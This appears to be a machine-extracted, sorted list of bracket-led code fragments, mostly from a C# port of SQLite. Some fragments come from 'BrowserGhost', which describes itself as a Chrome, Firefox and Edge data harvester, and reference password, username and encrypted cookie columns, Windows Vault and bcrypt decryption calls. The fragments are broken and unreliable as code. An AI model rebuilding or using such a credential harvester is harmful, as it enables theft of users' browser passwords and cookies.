"["" + bInteger + """
"["" + bLong + """
"["" + bText + """
"[""BytesPerSector"""
"[""SystemName"""
"[""User"""
"[""host_key"""
"[""name"""
"[""origin_url"""
"[""password_value"""
"[""title"""
"[""url"""
"[""username_value"""
"[-offsetof(sqlite3_file,h)"
"[0,11"
"[0,23"
"[0,365"
"[0,59"
"[0,6"
"[1,31"
"[DllImport( ""Kernel32.dll"" )"
"[DllImport( ""kernel32.dll"" )"
"[DllImport(""advapi32.dll"")"
"[DllImport(""advapi32.dll"", CharSet = CharSet.Auto, SetLastError = true)"
"[DllImport(""advapi32.dll"", SetLastError = true)"
"[DllImport(""bcrypt.dll"")"
"[DllImport(""bcrypt.dll"", EntryPoint = ""BCryptGetProperty"")"
"[DllImport(""bcrypt.dll"", EntryPoint = ""BCryptSetProperty"")"
"[DllImport(""kernel32.dll"", SetLastError = true)"
"[DllImport(""vaultcli.dll"")"
"[DllImport(""vaultcli.dll"", EntryPoint = ""VaultGetItem"")"
"[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)"
"[MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)"
"[ROWID | ""rowid"""
"[StructLayout( LayoutKind.Explicit, Size = 16, CharSet = CharSet.Ansi )"
"[StructLayout(LayoutKind.Explicit, CharSet = CharSet.Ansi)"
"[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)"
"[] D, uint N, int X, int E, ref byte["
"[] V, int I ) { V[I >> 3"
"[] V, int I ) { return ( V[I >> 3"
"[] a, int Offset, byte["
"[] aScratchFree, int["
"[] bA, byte["
"[] cipherText, byte["
"[] cookieBytes = Convert.FromBase64String((string)row[""encrypted_value"""
"[] d, byte["
"[] encryptedData, byte["
"[] include child pointers.  Either way, all cells in apCell["
"[] iv, byte["
"[] pz, sqlite3 db, string zFormat, params string["
"[])va_arg( ap, ""byte["
"[], hence Ex2.aiColumn[1"
"[].  In this way, all cells in apCell["
"[assembly: AssemblyCompany("""")"
"[assembly: AssemblyConfiguration("""")"
"[assembly: AssemblyCopyright("""")"
"[assembly: AssemblyCulture("""")"
"[assembly: AssemblyDescription(""BrowserGhost is a Chrome, Firefox and Edge data harvestor."")"
"[assembly: AssemblyFileVersion(""1.0.0.0"")"
"[assembly: AssemblyProduct("""")"
"[assembly: AssemblyTitle(""BrowserGhost"")"
"[assembly: AssemblyTrademark("""")"
"[assembly: AssemblyVersion( ""3.6.17.1"" )"
"[assembly: Guid(""2133c634-4139-466e-8983-9a23ec99e01b"")"
"[sqlite3SchemaToIndex(db, p->pSchema)"
"[sqlite3_next_stmt(D,S)"
[  
[ ((unsigned char)zBuf[j
[ sqlite3GlobalConfig.szPage* sqlite3GlobalConfig.nPage
[ sqlite3GlobalConfig.szScratch* sqlite3GlobalConfig.nScratch
[ yy_shift_ofst[S
[%d
[%s
[' );// zBuf[k++
[': quote = '
[( ( pRangeEnd != null || nEq != 0 ) ? 1 : 0 ) * ( 1 + bRev )
[( (byte)x )
[( --bufpt )
[( bufpt++ )
[( bufpt++ ) + i
[( c >> 4 ) & 0xf
[( nBlob * 2 ) + 2
[( nBlob * 2 ) + 3
[( start_constraints << 2 ) + ( startEq << 1 ) + bRev
[( sz + 7 ) / 8 + 1
[( zBlob[i
[(P).cellOffset+2*(I)
[(byte)( x )
[(byte)z[_z++
[(int)( iRandom % ( zChars.Length - 1 ) )
[(int)offset
[(int)offset + 0
[(int)offset + 1
[(int)offset + 2
[(int)offset + 3
[(u8)wsdPrng.i
[(u8)zName[0
[(unsigned char)(x)
[(unsigned char)X
[*
[*(unsigned char *)(x)
[*(unsigned char *)(y)
[*a
[*b
[*pnEntry * szEntry
[*z
[*zIn
[+
[++_fmt
[++j
[++k
[-
[-(iCell + 1)
[-(iFOFC + 1)
[--bufpt
[--mem0.nScratchFree
[--nQPlan
[--p.contextStackTop
[--pParse.nTempReg
[-1
[-1 - pOp.p2
[-10
[-2
[-3
[-4
[-5
[-6
[-7
[-8
[-9
[-ffast-math
[-yysize
[...
[.github.com
[.google.com
[0
[0 + 0
[0 + 1
[0 + 2
[0 + 3
[0 + offset
[0..n-1
[1
[1 + offset
[10
[100
[1000
[12
[15
[150
[16
[18
[19
[2
[2 + offset
[20
[21
[22
[23
[24
[3
[3 + offset
[30
[32
[32 + 0
[32 + 1
[32 + 2
[32 + 3
[4
[4 + k * 4
[40
[4764
[5
[540
[6
[7
[8
[8 + closest * 4
[9
[= value
[A
[ATTACH
[ATTACH | attached databases
[AUTOINCREMENT
[Administrator
[BEGIN
[BITVEC_NPTR
[BITVEC_SZ
[BLOB handle
[BLOB handle | handle
[BLOB handles
[BMS*2*40
[BTREE_DEFAULT_CACHE_SIZE - 1
[BTREE_FILE_FORMAT - 1
[BTREE_SCHEMA_VERSION - 1
[BTREE_TEXT_ENCODING - 1
[BTREE_TEXT_ENCODING-1
[COMMIT
[COMMIT | committed
[CREATE TRIGGER | trigger
[DELETE
[DROP TABLE
[ENC( pParse.db )
[ERROR
[FieldOffset( 0 )
[FieldOffset( 12 )
[FieldOffset( 4 )
[FieldOffset( 8 )
[FieldOffset(0)
[FieldOffset(8)
[Flags
[GLOB
[H10011
[H10014
[H10021
[H10022
[H10023
[H10101
[H10102
[H10201
[H10202
[H10331
[H10336
[H10337
[H10339
[H10511
[H10512
[H10533
[H10536
[H11203
[H11206
[H11209
[H11212
[H11215
[H11218
[H11302
[H11304
[H12011
[H12012
[H12013
[H12014
[H12015
[H12019
[H12101
[H12102
[H12104
[H12105
[H12107
[H12110
[H12113
[H12116
[H12119
[H12122
[H12125
[H12131
[H12134
[H12137
[H12138
[H12201
[H12202
[H12221
[H12223
[H12241
[H12243
[H12261
[H12263
[H12271
[H12272
[H12281
[H12282
[H12283
[H12284
[H12285
[H12287
[H12288
[H12289
[H12290
[H12311
[H12312
[H12314
[H12316
[H12318
[H12341
[H12343
[H12344
[H12371
[H12373
[H12374
[H12376
[H12379
[H12382
[H12501
[H12502
[H12503
[H12504
[H12505
[H12506
[H12507
[H12510
[H12511
[H12512
[H12520
[H12521
[H12522
[H12551
[H12552
[H12553
[H12554
[H12701
[H12702
[H12703
[H12704
[H12706
[H12707
[H12709
[H12711
[H12712
[H12713
[H12714
[H12717
[H12719
[H12721
[H12723
[H12762
[H12766
[H12769
[H12801
[H12802
[H12803
[H12807
[H12808
[H12809
[H12911
[H12912
[H12913
[H12914
[H12915
[H12916
[H12917
[H12918
[H12931
[H12932
[H12933
[H12934
[H12951
[H12952
[H12953
[H12954
[H12955
[H12961
[H12962
[H12963
[H12964
[H12971
[H12973
[H12975
[H12977
[H12979
[H12981
[H12983
[H12986
[H13011
[H13012
[H13013
[H13014
[H13015
[H13016
[H13019
[H13021
[H13101
[H13102
[H13103
[H13123
[H13143
[H13146
[H13149
[H13152
[H13202
[H13506
[H13509
[H13512
[H13515
[H13518
[H13521
[H13524
[H13527
[H13530
[H13533
[H13536
[H13539
[H13542
[H13545
[H13548
[H13551
[H13601
[H13621
[H13641
[H13661
[H13711
[H13721
[H13723
[H13724
[H13725
[H13726
[H13727
[H13741
[H13742
[H13743
[H13744
[H13745
[H13746
[H13748
[H13761
[H13762
[H13763
[H13771
[H13772
[H13803
[H13806
[H13809
[H13812
[H13815
[H13818
[H13821
[H13824
[H13827
[H13830
[H14103
[H14106
[H14120
[H14123
[H14126
[H14129
[H14132
[H14135
[H14138
[H14141
[H14144
[H14147
[H14150
[H14153
[H14156
[H14159
[H14162
[H14165
[H14168
[H14203
[H14206
[H14209
[H14212
[H14215
[H15103
[H15106
[H15109
[H15112
[H15115
[H15118
[H15121
[H15124
[H15127
[H15130
[H15133
[H15136
[H15304
[H15306
[H15308
[H15310
[H16103
[H16106
[H16109
[H16112
[H16118
[H16121
[H16127
[H16130
[H16133
[H16136
[H16139
[H16142
[H16211
[H16213
[H16215
[H16217
[H16243
[H16253
[H16272
[H16274
[H16276
[H16277
[H16278
[H16279
[H16351
[H16352
[H16353
[H16354
[H16355
[H16358
[H16403
[H16406
[H16409
[H16412
[H16415
[H16418
[H16421
[H16424
[H16427
[H16430
[H16433
[H16436
[H16439
[H16442
[H16445
[H16448
[H16451
[H16454
[H16457
[H16460
[H16463
[H16603
[H16604
[H16606
[H16609
[H16612
[H16615
[H16618
[H16621
[H16624
[H16627
[H16630
[H16702
[H16704
[H16706
[H17303
[H17304
[H17305
[H17306
[H17310
[H17312
[H17315
[H17318
[H17321
[H17322
[H17323
[H17341
[H17342
[H17371
[H17373
[H17374
[H17375
[H17392
[H17403
[H17406
[H17407
[H17813
[H17814
[H17816
[H17819
[H17821
[H17824
[H17833
[H17836
[H17839
[H17843
[H17853
[H17856
[H17859
[H17862
[H17863
[H17865
[H17868
[H17873
[H17874
[H17875
[H17876
[H17877
[H17879
[H17882
[H17885
[H17888
[H33020
[I
[I>>3
[INSERT
[INSTEAD OF trigger
[INTEGER PRIMARY KEY
[Idx
[In
[LIKE
[MAX_PATH
[MAX_PATH+1
[MarshalAs(UnmanagedType.Bool)
[MarshalAs(UnmanagedType.LPWStr)
[N
[N-1
[NDELAY - 1
[N_SORT_BUCKET
[ON CONFLICT
[ON CONFLICT | ON CONFLICT REPLACE
[Offset + 0
[Offset + 1
[P2
[PASSWORD
[PRAGMA
[PRAGMA cache_size
[REPLACE
[ROLLBACK
[ROLLBACK | rolled back
[ROUND8( sizeof( UnpackedRecord ) )
[ROUND8(sizeof(UnpackedRecord)) + sizeof(Mem)*3 + 7
[ROWID
[ROWID | ROWIDs
[S
[SAVE_SZ
[SELECT
[SQL parameter
[SQL parameters
[SQLITE_ABORT
[SQLITE_ACCESS_EXISTS
[SQLITE_ACCESS_READ
[SQLITE_ACCESS_READWRITE
[SQLITE_ANY
[SQLITE_BLOB
[SQLITE_BUSY
[SQLITE_CANTOPEN
[SQLITE_CONFIG_GETMUTEX
[SQLITE_CONFIG_MALLOC
[SQLITE_CONFIG_MULTITHREAD
[SQLITE_CONFIG_MUTEX
[SQLITE_CONFIG_PAGECACHE
[SQLITE_CONFIG_PCACHE
[SQLITE_CONFIG_SCRATCH
[SQLITE_CONFIG_SINGLETHREAD
[SQLITE_CONFIG_SINGLETHREAD | configuration option
[SQLITE_COPY | action code
[SQLITE_CORRUPT
[SQLITE_DBCONFIG_LOOKASIDE
[SQLITE_DBSTATUS_LOOKASIDE_USED
[SQLITE_DELETE
[SQLITE_DENY
[SQLITE_DONE
[SQLITE_ENABLE_COLUMN_METADATA
[SQLITE_ENABLE_MEMSYS3
[SQLITE_ENABLE_MEMSYS5
[SQLITE_ENABLE_UNLOCK_NOTIFY
[SQLITE_ERROR
[SQLITE_FCNTL_LOCKSTATE
[SQLITE_FCNTL_LOCKSTATE | list of opcodes
[SQLITE_FLOAT
[SQLITE_FULL
[SQLITE_IGNORE
[SQLITE_INSERT
[SQLITE_INTEGER
[SQLITE_INTEGER | datatype
[SQLITE_INTEGER | datatype code
[SQLITE_INTERRUPT
[SQLITE_IOCAP_ATOMIC
[SQLITE_IOCAP_ATOMIC16K
[SQLITE_IOCAP_ATOMIC1K
[SQLITE_IOCAP_ATOMIC2K
[SQLITE_IOCAP_ATOMIC32K
[SQLITE_IOCAP_ATOMIC4K
[SQLITE_IOCAP_ATOMIC512
[SQLITE_IOCAP_ATOMIC64K
[SQLITE_IOCAP_ATOMIC8K
[SQLITE_IOCAP_SAFE_APPEND
[SQLITE_IOCAP_SEQUENTIAL
[SQLITE_IOERR
[SQLITE_IOERR_ACCESS | SQLITE_IOERR_XXX
[SQLITE_IOERR_BLOCKED
[SQLITE_IOERR_READ | extended result codes
[SQLITE_LIMIT_ATTACHED
[SQLITE_LIMIT_COLUMN
[SQLITE_LIMIT_COMPOUND_SELECT
[SQLITE_LIMIT_EXPR_DEPTH
[SQLITE_LIMIT_FUNCTION_ARG
[SQLITE_LIMIT_LENGTH
[SQLITE_LIMIT_LIKE_PATTERN_LENGTH
[SQLITE_LIMIT_SQL_LENGTH
[SQLITE_LIMIT_VARIABLE_NUMBER
[SQLITE_LOCKED
[SQLITE_LOCK_EXCLUSIVE
[SQLITE_LOCK_NONE
[SQLITE_LOCK_PENDING
[SQLITE_LOCK_RESERVED
[SQLITE_LOCK_SHARED
[SQLITE_MISUSE
[SQLITE_NOMEM
[SQLITE_NULL
[SQLITE_OK
[SQLITE_OK | result codes
[SQLITE_OMIT_AUTOINIT
[SQLITE_OPEN_CREATE
[SQLITE_OPEN_DELETEONCLOSE
[SQLITE_OPEN_EXCLUSIVE
[SQLITE_OPEN_FULLMUTEX
[SQLITE_OPEN_MAIN_DB
[SQLITE_OPEN_MAIN_JOURNAL
[SQLITE_OPEN_MASTER_JOURNAL
[SQLITE_OPEN_NOMUTEX
[SQLITE_OPEN_READONLY
[SQLITE_OPEN_READWRITE
[SQLITE_OPEN_SUBJOURNAL
[SQLITE_OPEN_TEMP_DB
[SQLITE_OPEN_TEMP_JOURNAL
[SQLITE_OPEN_TRANSIENT_DB
[SQLITE_OS_OTHER=1
[SQLITE_RANGE
[SQLITE_READ
[SQLITE_READONLY
[SQLITE_ROW
[SQLITE_SCHEMA
[SQLITE_STATIC
[SQLITE_STATUS_MEMORY_USED | SQLITE_STATUS_...
[SQLITE_STMTSTATUS_SORT - 1
[SQLITE_STMTSTATUS_SORT | counter
[SQLITE_STMTSTATUS_SORT | counters
[SQLITE_SYNC_DATAONLY
[SQLITE_SYNC_FULL
[SQLITE_SYNC_NORMAL
[SQLITE_TEXT
[SQLITE_THREADSAFE
[SQLITE_THREADSAFE=0
[SQLITE_THREADSAFE=1
[SQLITE_TRANSIENT
[SQLITE_UPDATE
[SQLITE_UTF16
[SQLITE_UTF16BE
[SQLITE_UTF16LE
[SQLITE_UTF16_ALIGNED
[SQLITE_UTF8
[SQLITE_UTF8 | text encoding
[SQLITE_VERSION
[SQLITE_VERSION_NUMBER
[SQLite Shared-Cache Mode
[StructLayout(LayoutKind.Sequential)
[UPDATE
[URL
[USERNAME
[Using the SQLite Online Backup API
[Using the SQLite Unlock Notification Feature
[Virtual
[WhereTerm.idx
[X
[YYTRACKMAXSTACKDEPTH
[YYWILDCARD
[\
[] A = new byte[4
[] Buffer = new byte[encryptedData.Length - 15
[] Concat(params byte[
[] Decrypt(byte[
[] OPFLG_INITIALIZER = new int[
[] SaveBuf = new Parse[10
[] _pCell_4 = new byte[pCell.Length + 4
[] a = new FuncDef[23
[] a = new WhereLevel[
[] a = new int[11
[] a;                             /* Each a[
[] a; PgHdr p;//a[N_SORT_BUCKET
[] aBalanceQuickSpace = new u8[13
[] aBitmap = new byte[BITVEC_NELEM
[] aBtree = new Btree[SQLITE_MAX_ATTACHED + 1
[] aBucket = new RowSetEntry[40
[] aColCache = new yColCache[SQLITE_N_COLCACHE
[] aColl = (CollSeq[
[] aColl = new CollSeq[1
[] aCopy = new byte[
[] aCounter = new int[2
[] aDateTimeFuncs = new FuncDef[
[] aDb = new Db[SQLITE_MAX_ATTACHED
[] aDbStatic = new Db[
[] aEndOp = new int[
[] aEntry = new RowSetEntry[ROWSET_ENTRY_PER_CHUNK
[] aFunc = (FuncDef[
[] aHardLimit = new int[
[] aHash = new u32[BITVEC_NINT
[] aJournalMagic = new byte[
[] aKey1 = new byte[pKey1.Length - offset
[] aKeyword = new Keyword[
[] aLimit = new int[SQLITE_N_LIMIT
[] aMagic = new byte[8
[] aMagic = new u8[8
[] aMoveOp = new u8[
[] aMsg = new string[
[] aOffset;     /* aOffset[i
[] aOvfl = new _OvflCell[5
[] aPragma = new sPragmaType[
[] aProg = (int[
[] aRegIdx       /* Only delete if aRegIdx!=0 && aRegIdx[i
[] aSize = new u32[
[] aSortOrder;   /* If defined an aSortOrder[i
[] aStart = new u8[
[] aStartOp = new int[
[] aStatic = new WhereTerm[1
[] aStatic = new WhereTerm[8
[] aStep = new u8[
[] aTempReg = new int[8
[] aType;       /* aType[i
[] aXRef = null;         /* aXRef[i
[] ac = new byte[4
[] addrOpenEphm = new int[3
[] aiIdx = new u16[BTCURSOR_MAX_DEPTH
[] aiValues = new u32[BITVEC_NINT
[] and BtCursor.aiIdx[
[] and aOffset[
[] and szCell[
[] and_logic = new byte[
[] apAll = new Token[3
[] apAux = new AuxData[2
[] apCopy = new MemPage[NB
[] apDiv = new int[NB - 1
[] apNew = new MemPage[NB + 2
[] apOld = new MemPage[NB
[] apPage = new MemPage[BTCURSOR_MAX_DEPTH
[] apSub = new Bitvec[BITVEC_NPTR
[] argv = (string[
[] argv1 = new sqlite3_value[argc - 1
[] array.  The slot[
[] array.  aDb[0
[] azArg = new string[4
[] azColName = new string[
[] azModeName = new string[
[] azModuleArg;/* Text of all module args. [0
[] azOne = new byte[
[] azType = new string[
[] b01 = new byte[2
[] buf = new char[etBUFSIZE
[] buf = new u8[10
[] cntIdx = new VdbeOpList[
[] cntNew = new int[NB + 2
[] columnValues = new object[columnCount
[] cookieValue = new int[SQLITE_MAX_ATTACHED + 2
[] data = new byte[Buffer.Length - tag.Length
[] dbFileVers = new byte[pPager.dbFileVers.Length
[] dbFileVers = new u8[16
[] delays = new u8[
[] dropTrigger = new VdbeOpList[
[] dxRealloc( ref byte[
[] encnames = new EncName[
[] encnames = new string[
[] endCode = new VdbeOpList[
[] first = new u8[1
[] fmtinfo = new et_info[
[] getCacheSize = new VdbeOpList[
[] hexdigits = new char[
[] iLength = new int[
[] iOffset = new int[
[] iValue = new u8[
[] idxErr = new VdbeOpList[
[] in order of aBtree[
[] iv = new byte[
[] ivData = new byte[MaxAuthTagSize(hAlg)
[] ix = new int[BMS
[] k = new u8[256
[] lenOne = new int[
[] masterKey = new byte[
[] meta = new u32[5
[] mxValue = new int[9
[] nowValue = new int[9
[] ops = new u8[
[] or ->aFunc[
[] or AggInfo.aFunc[
[] or_logic = new byte[
[] p = new byte[4
[] pBuf = (byte[
[] pCell = new byte[13
[] pCell = pPage.aOvfl[0
[] pCellBody = new u8[pPage.aData.Length - pCell + pPage.childPtrSize
[] pColl = (CollSeq[
[] pKey = new byte[pCur.nKey
[] pNext_4 = new byte[nCell + 4
[] pSpace = new u8[pCur.pBt.pageSize
[] pTemp = new byte[pCell.Length
[] pTemp = new byte[sz + leafCorrection
[] pTemp = new u32[pPager.pTmpSpace.Length
[] pZeroBlob = new byte[n
[] readCookie = new VdbeOpList[
[] result = new byte[len - 1 + 1
[] s = new u8[256
[] setCookie = new VdbeOpList[
[] setMeta6 = new VdbeOpList[
[] sqlite3CtypeMap = new byte[
[] sqlite3MemRealloc( ref byte[
[] sqlite3Realloc( byte[
[] sqlite3UpperToLower = new int[
[] sqlite3Utf8Trans1 = new byte[
[] szCell = new int[1
[] szCell;                         /* Local size of all cells in apCell[
[] szNew = new int[NB + 2
[] tag = new byte[16
[] temp = new byte[masterKey.Length - 5
[] that might match zPattern[
[] totals = new u8[
[] urls = new string[26
[] value = new byte[size
[] wc = new char[3
[] yyFallback = new YYCODETYPE[
[] yyRuleInfo = new _yyRuleInfo[
[] yy_action = new YYACTIONTYPE[
[] yy_default = new YYACTIONTYPE[
[] yy_lookahead = new YYCODETYPE[
[] yy_reduce_ofst = new short[
[] yy_shift_ofst = new short[
[] yymsp = new yyStackEntry[0
[] yystack = new yyStackEntry[YYSTACKDEPTH
[] z = sqlite3_value_blob( argv[0
[] zBlob = sqlite3_value_blob( argv[0
[] zBuf = new u8[N
[] zChunk = new byte[JOURNAL_CHUNKSIZE
[] zDbHeader = new byte[100
[] zHeader = new u8[aJournalMagic.Length + 4
[] zeroHdr = new byte[28
[] zerobyte = new u8[1
[] { tagLengthsValue[4
[])ap[vaNEXT - 1
[])p.data )[0
[].  But if buf[
[].  zOut[
[].iColumn.  aConstraint[
[].zType and aCol[
[][
[]colv = (string[
[^...
[_fmt
[_pCell++
[_pIter++
[_pOrWC
[_pt
[_yyidx + offset
[a
[a + offsetLeft
[a-b-c
[a-z
[aData.Length
[aLen[ii
[aOvfl.Length
[aXRef[i
[addr
[addr + 0
[addr + 1
[addr + N
[aiValues.Length
[amt
[amt+1
[apDiv[i
[application-defined SQL functions
[assembly: ComVisible(false)
[autocommit mode
[b
[bRev
[bestJ
[bin
[buf.Length - 1
[buf.Length - 2
[bufStr.Length
[bufpt + i
[bufpt + i - nPad
[bufpt + j
[bufpt + j++
[bufpt - 1
[bufpt++
[c
[c & 0xf
[c - 0x20
[c - 0xc0
[c-0x20
[c-0x40
[c-0xc0
[c1
[c2
[cbrk
[cellOffset + i * 2
[cellbody
[ci.iCell
[cnt
[cnt + 1
[cnt - 1
[cnum
[column access functions
[count
[count_changes pragma
[d
[database connection
[database connection | connections
[database connections
[database.
[db->nVTrans
[db->nVTrans++
[db.nDb
[db.nDb - 1
[db.nExtension++
[dbFileVers.Length
[deprecated
[e
[eMode
[enc
[enc - 1
[error code
[error codes
[etBUFSIZE-1
[explorer
[extended error code
[extended error codes
[extended result code
[extended result codes
[github.com
[got
[h
[hdr
[hdr + 1
[hdr + 2
[hdr + 5
[hdr + 6
[hdr + 7
[hdr+1
[host parameters
[i
[i + 1
[i + Offset
[i + addr
[i + iFrom
[i + nExtra
[i + offset
[i - 1
[i / 2
[i / BITVEC_SZELEM
[i*2
[i*2+1
[i++
[i+1
[i+6
[i+7
[i-1
[i/2
[iAlias - 1
[iAlias-1
[iArg
[iBest
[iCell
[iCellDepth
[iCellDepth + 1
[iCellFirst
[iChunkOffset
[iCol
[iColumn
[iCur
[iData
[iDb
[iEnc
[iFallback
[iFirst++
[iFirst...
[iFrom
[iFromHdr
[iIdx
[iIdx+1
[iLevel
[iLookAhead
[iLoop
[iMem
[iMem+1
[iMem+nCol
[iMem+nCol+1
[iMem+nCol+nCol
[iOff % nDestPgsz
[iOff%nSrcPgsz
[iOffset + 0
[iOffset + 1
[iOffset + 2
[iOffset + i
[iOffset + i + 1
[iOffset + i + 2
[iOffset+0
[iOffset+i
[iOffset+n - 1
[iOfst
[iOvflSpace
[iPKey
[iPage
[iPage - 1
[iParent
[iSpace1
[iSrc
[iStart
[iStart + n - 1
[iTabDb
[iTerm
[iToHdr
[iType-2
[iZnum
[iZnum + i
[i_pMem
[i_pMem++
[id-2
[idx
[idx + nSkip
[idx + var * p.nResColumn
[idx = pWC.nTerm++
[idx1
[idxLru
[idxNew
[idxNew1
[idxNew2
[idxTerm
[ii
[info.iOverflow
[infop.charset
[int offset
[iz
[iz - 1
[izIn + i
[j
[j + 0
[j + 1
[j - 1
[j - 2
[j++
[j+nDel
[j-1
[k
[k++
[keyColumn
[len
[length
[limit categories
[limitId
[limits | Limits in SQLite
[limits | SQLITE_MAX_XYZ
[limits | hard upper bound
[longvalue % (ulong)_base
[lookaside memory allocator
[max_page_count
[mem0.nScratchFree++
[minI
[n
[n - 1
[n++
[nAlloc
[nArg
[nArg == 0 ? 1 : nArg
[nArg++
[nAux
[nByte
[nByte + 1
[nByteWInfo
[nBytes
[nBytes - 1
[nCell
[nChar
[nCol
[nCol + 1
[nCol+1
[nCurrent
[nCursor == 0 ? 1 : nCursor
[nEq
[nExpr
[nField
[nField + 1
[nField - 1
[nHeader
[nIdx
[nIdx + 1
[nMaster
[nMasterJournal
[nMasterJournal+1
[nMaxCells
[nMem + 1
[nName
[nName + 1
[nNew
[nNew - 1
[nNewSize
[nOld - 1
[nOrderBy
[nOrderBy++
[nPathname
[nPattern - 1
[nPattern-1
[nQPlan
[nQPlan++
[nQPlan-1
[nRoot + 1
[nSize
[nTerm
[nVal
[nVar
[nVar == 0 ? 1 : nVar
[name
[nested
[new_size
[offset
[offset + 0
[offset + 1
[offset + 2
[offset + 3
[offset + 4
[offset + 5
[offset + 6
[offset + 7
[offset + 8
[offset + i
[offset/ovflSize
[oldCell + 0
[oldCell + 1
[oldCell + 2
[oldCell + 3
[op
[op - 1
[opcode
[origPc
[p->n
[p->nMem
[p.iDb
[p.nAlloc
[p.nChar
[p.nCol
[p.nCol - 1
[p.nData++ -1
[p.nExpr
[p.nExpr - i
[p.nField + 1
[p.nId
[p.nMem
[p.nMem - iCur
[p.nOp
[p.nOp - 1
[p.nOp-1
[p.nOpAlloc
[p.nSrc
[p.nSrc - 1
[p.pEList.nExpr - k
[p.pFresh.Length - p.nFresh
[p.z.Length
[p1
[p1 + idx
[p1 + pOp.p3 - n - 1
[p1++
[p2
[p2 + idx
[p2++
[pArray->nMutex++
[pBt.pageSize
[pBt.pageSize * (nMaxCells)
[pBt.pageSize + k*i
[pBt.usableSize
[pC.iDb
[pC.nData
[pC.nData + 1
[pC.nData + 2
[pCache.szPage
[pCell + 0
[pCell + 1
[pCell.Length
[pCol.affinity - SQLITE_AFF_TEXT
[pColDef.n-1
[pCrsr.info.nData
[pCsr.iPage
[pCur.iPage
[pCur.iPage - 1
[pCur.iPage--
[pCur.info.nLocal
[pCur.info.nSize - pCur.info.nHeader
[pD0
[pD0 - pOp.p1
[pExpr->iColumn
[pExpr.iAgg
[pExpr.iColumn
[pFK.aCol[j
[pGroupBy.nExpr - k
[pIdx.aiColumn[i
[pIdx.aiColumn[j
[pIdx.aiColumn[n
[pIdx.nColumn
[pIn1.n + pIn2.n
[pIn2.n
[pLevel.iFrom
[pLevel.u._in.nIn
[pLevel.u._in.nIn - 1
[pList.nExpr
[pList.nExpr - 1
[pList.nExpr - i
[pList.nExpr++
[pList.nSrc - 1
[pMaskSet.n++
[pMem->n
[pMem->n + 1
[pMem->n&~1
[pMem->n+1
[pMem.enc
[pMem.n
[pMem.n+1
[pModuleName->n
[pNew.nCol - 1
[pNew.nExpr - 1
[pOp->p1
[pOp->p2 - 1
[pOp->p4.i
[pOp.opcode
[pOp.p1
[pOp.p1 + i
[pOp.p1 + j
[pOp.p1 + pD0
[pOp.p1 - 1
[pOp.p2
[pOp.p2 + i
[pOp.p2 + ra
[pOp.p3
[pOp.p3 + rI
[pOp.p4.i + ii
[pOp.p5
[pOp.p5 - 1
[pOrTerm.iParent
[pOrWC.nTerm
[pOrWc.nTerm - 1
[pOrWc.nTerm - 1 - i
[pOut++
[pPage.cellOffset + 2 * idx
[pPage.cellOffset + nCell * 2
[pPage.childPtrSize
[pPage.hdrOffset + 3
[pPage.hdrOffset + 4
[pPager.pVfs.mxPathname + 1
[pPager.pageSize
[pParent.hdrOffset + 8
[pParse->nVtabLock++
[pParse->zTail-zSqlCopy
[pParse.nAlias
[pParse.nAliasAlloc
[pParse.nTableLock
[pParse.nTableLock++
[pParse.nTempReg++
[pParse.nVarExpr++
[pParse.nVarExprAlloc
[pParser.yyidx
[pSrc.nSrc - 1
[pSrc.nSrc - i
[pTab->iPKey
[pTab.nCol
[pTab.nCol - 1
[pTabList.nSrc
[pTerm.iParent
[pTo.n
[pToken.n
[pWC.nTerm
[pWC.nTerm - j
[pWC.nTerm - k
[pX.op - TK_GT
[pageSize
[pagecache memory allocator
[parameter
[parameter binding
[payloadSize
[pbegin
[pc
[pc + 0
[pc + 1
[pc + 2
[pc + 3
[pc - 1
[plainTextSize
[pnEntry
[pre
[prepared statement
[prepared statements
[protected sqlite3_value
[r
[r.nField
[rI
[ra
[rc
[regPrev
[res.nAlloc
[result code
[result codes
[return: MarshalAs(UnmanagedType.Bool)
[rowid
[s.Length
[sCheck.nPage + 1
[scratch memory allocator
[serial_type
[shared cache mode
[shared lock
[sizeof( PgHdr ) + pCache.szExtra
[sizeof( VdbeCursor )
[sizeof( VdbeCursor ) + 2 * nField * sizeof( u32 )
[sizeof(aJournalMagic)+20
[sqlite3
[sqlite3GlobalConfig.szPage * sqlite3GlobalConfig.nPage
[sqlite3_aggregate_context()
[sqlite3_auto_extension()
[sqlite3_backup
[sqlite3_backup_finish()
[sqlite3_backup_init()
[sqlite3_backup_step()
[sqlite3_bind_blob | bindings
[sqlite3_bind_blob | bound
[sqlite3_bind_blob | sqlite3_bind_*() API
[sqlite3_bind_blob|bindings
[sqlite3_bind_blob|sqlite3_bind()
[sqlite3_bind_parameter_count()
[sqlite3_bind_parameter_index()
[sqlite3_bind_parameter_name()
[sqlite3_bind_value()
[sqlite3_bind_zeroblob()
[sqlite3_blob_bytes()
[sqlite3_blob_close | close
[sqlite3_blob_close()
[sqlite3_blob_open | incremental BLOB I/O
[sqlite3_blob_open()
[sqlite3_blob_read()
[sqlite3_blob_write()
[sqlite3_busy_handler | busy handler
[sqlite3_busy_handler | busy-handler function
[sqlite3_busy_handler()
[sqlite3_busy_timeout()
[sqlite3_changes()
[sqlite3_clear_bindings()
[sqlite3_close
[sqlite3_close()
[sqlite3_close(C)
[sqlite3_collation_needed()
[sqlite3_collation_needed16()
[sqlite3_column_blob()
[sqlite3_column_database_name | column metadata interfaces
[sqlite3_column_text()
[sqlite3_column_value()
[sqlite3_commit_hook()
[sqlite3_complete()
[sqlite3_complete16()
[sqlite3_config
[sqlite3_config()
[sqlite3_context
[sqlite3_context | SQL function context
[sqlite3_context_db_handle()
[sqlite3_create_collation()
[sqlite3_create_collation16()
[sqlite3_create_collation_v2()
[sqlite3_create_function()
[sqlite3_create_function16()
[sqlite3_create_module()
[sqlite3_create_module_v2()
[sqlite3_db_config()
[sqlite3_db_mutex
[sqlite3_db_status()
[sqlite3_enable_load_extension()
[sqlite3_errcode()
[sqlite3_errmsg()
[sqlite3_errmsg16()
[sqlite3_exec()
[sqlite3_extended_result_codes()
[sqlite3_file
[sqlite3_file_control()
[sqlite3_finalize | finalize
[sqlite3_finalize | finalized
[sqlite3_finalize()
[sqlite3_free
[sqlite3_free()
[sqlite3_free_table()
[sqlite3_get_auxdata()
[sqlite3_get_table()
[sqlite3_initialize()
[sqlite3_interrupt | interrupt
[sqlite3_interrupt()
[sqlite3_io_methods
[sqlite3_last_insert_rowid()
[sqlite3_libversion()
[sqlite3_libversion_number()
[sqlite3_limit
[sqlite3_limit()
[sqlite3_load_extension()
